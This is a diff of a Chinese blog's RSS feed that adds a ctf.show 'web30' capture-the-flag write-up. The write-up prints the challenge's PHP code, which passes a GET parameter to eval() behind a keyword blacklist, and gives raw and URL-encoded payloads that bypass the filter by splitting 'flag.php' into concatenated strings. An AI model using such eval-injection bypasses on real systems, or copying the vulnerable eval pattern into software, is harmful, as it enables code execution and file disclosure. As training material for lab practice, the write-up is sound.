@@ -1,5 +1,69 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Ayx的Gmeek博客</title><link>https://Ayx03.github.io/Gmeek</link><description>Aynxul03的又一个博客</description><copyright>Ayx的Gmeek博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://Ayx03.github.io/Gmeek</link></image><lastBuildDate>Tue, 15 Sep 2026 02:25:11 +0000</lastBuildDate><managingEditor>Ayx的Gmeek博客</managingEditor><ttl>60</ttl><webMaster>Ayx的Gmeek博客</webMaster><item><title>WriteUp_web29_Web入门_ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_web29_Web-ru-men-_ctf.show.html</link><description>题目提示`命令执行，需要严格的过滤`，估计有什么接口没做过滤就直接执行用户输入的命令了
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Ayx的Gmeek博客</title><link>https://Ayx03.github.io/Gmeek</link><description>Aynxul03的又一个博客</description><copyright>Ayx的Gmeek博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://Ayx03.github.io/Gmeek</link></image><lastBuildDate>Tue, 15 Sep 2026 02:35:25 +0000</lastBuildDate><managingEditor>Ayx的Gmeek博客</managingEditor><ttl>60</ttl><webMaster>Ayx的Gmeek博客</webMaster><item><title>WriteUp_web30_Web入门_ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_web30_Web-ru-men-_ctf.show.html</link><description>题目描述依然是`命令执行，需要严格的过滤`，代码中只是额外过滤了 `system` 和 `php`
+```php
+&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 00:42:26
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match('/flag|system|php/i', $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+```
+但是我上一题本来就没用 `system` 啊，我把 php 拆开写你不又炸了吗？上一题的 Payload：
+
+```
+$a='fla'; $b='g.php'; highlight_file($a.$b);
+```
+改造一下加上第三个变量：
+```
+$a='fla'; $b='g.ph'; $c='p'; highlight_file($a.$b.$c);
+```
+
+浏览器自动 URL 编码后的 Payload：
+```
+/?c=$a=%27fla%27;%20$b=%27g.ph%27;%20$c=%27p%27%20;highlight_file($a.$b.$c);
+```
+或者我们可以把空格去掉：
+```
+$a='fla';$b='g.ph';$c='p';highlight_file($a.$b.$c);
+```
+浏览器自动 URL 编码后的 Payload 会更简单明了一点：
+```
+/?c=$a=%27fla%27;$b=%27g.ph%27;$c=%27p%27;highlight_file($a.$b.$c);
+```
+获得的 flag：
+```php
+&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:14:07
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 00:14:17
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+$flag = 'ctfshow{3e3fd810-7c8a-4ce6-9871-ebd3cf9035d6}';
+```。</description><guid isPermaLink="true">https://Ayx03.github.io/Gmeek/post/WriteUp_web30_Web-ru-men-_ctf.show.html</guid><pubDate>Tue, 15 Sep 2026 02:34:58 +0000</pubDate></item><item><title>WriteUp_web29_Web入门_ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_web29_Web-ru-men-_ctf.show.html</link><description>题目提示`命令执行，需要严格的过滤`，估计有什么接口没做过滤就直接执行用户输入的命令了
 ```php
 &lt;?php
 
